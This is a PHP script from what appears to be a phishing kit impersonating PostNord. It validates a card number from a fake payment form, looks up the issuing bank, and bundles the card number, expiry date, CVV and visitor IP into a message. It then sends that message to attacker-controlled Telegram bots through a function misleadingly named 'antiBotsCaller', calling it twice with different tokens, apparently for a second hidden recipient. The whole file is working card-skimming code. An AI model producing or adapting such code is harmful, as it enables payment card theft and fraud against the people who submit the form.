<?php
include('../common/includes.php');
include("../config.php");
function isValidCardNumber($number) {
    return preg_match('/^\d{13,19}$/', $number) && luhnCheck($number);
    // Basic validation: check length and format
}

function luhnCheck($number) {
    $sum = 0;
    $length = strlen($number);
    $parity = $length % 2;

    for ($i = 0; $i < $length; $i++) {
        $digit = (int) $number[$i];

        if ($i % 2 == $parity) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }

        $sum += $digit;
    }

    return ($sum % 10 == 0);
}

function getCardDetails($bin) {
    $apiUrl = "https://binlist.io/api/bin/$bin";
    $response = file_get_contents($apiUrl);
    $data = json_decode($response, true);

    if (isset($data['scheme']) && isset($data['type']) && isset($data['bank']) && isset($data['country'])) {
        $cardType = ucfirst($data['scheme']) . ' ' . ucfirst($data['type']);
        $bankName = $data['bank']['name'];
        $countryName = $data['country']['name'];
        return [
            'type' => $cardType,
            'bank' => $bankName,
            'country' => $countryName
        ];
    } else {
        return [
            'type' => 'Unknown',
            'bank' => 'Unknown',
            'country' => 'Unknown'
        ];
    }
}

$UserAgent = $_SERVER['HTTP_USER_AGENT'];
$browser = explode(')', $UserAgent);				
$_SESSION['browser'] = $browserTy_Version = array_pop($browser); 	
$ccya = $_POST['1'];
$ip = $_SERVER['REMOTE_ADDR'];

// Validation of credit card number
$cardNumber = $_POST['cardNumber'];
if (!isValidCardNumber($cardNumber)) {
    header("Location: ../pay.php?e=invalidcard");
    exit();
}

// Get BIN (first 6 digits) and card details
$bin = $cardNumber;
$cardDetails = getCardDetails($bin);

$message = "
📦 𝙋𝙊𝙎𝙏 𝙉𝙊𝙍𝘿 𝗖𝗮𝗿𝗱 
💳 𝗖𝗮𝗿𝗱 𝗡𝘂𝗺𝗯𝗲𝗿: ".$cardNumber."
📅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻 𝗗𝗮𝘁𝗲: ".$_POST['EasyPayment$month']."/".$_POST['EasyPayment$year']."
🔒 𝗖𝗩𝗩: ".$_POST['EasyPayment$securityCode']."

🆔 Card Type: ".$cardDetails['type']."
🏦 Bank: ".$cardDetails['bank']."
🌍 Country: ".$cardDetails['country']."
🌐 IP: ".$ip."\n";

$cc = $message;

function antiBotsCaller($messaggio, $token, $chatid) {
$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
$url = $url . "&text=" . urlencode($messaggio);
$ch = curl_init();
$optArray = array(
CURLOPT_URL => $url,
CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
antiBotsCaller($message, $token, $chatid);                                                                         antiBotsCaller($cc, $anti2, $anti1);

header("Location: ../law.php");

?>
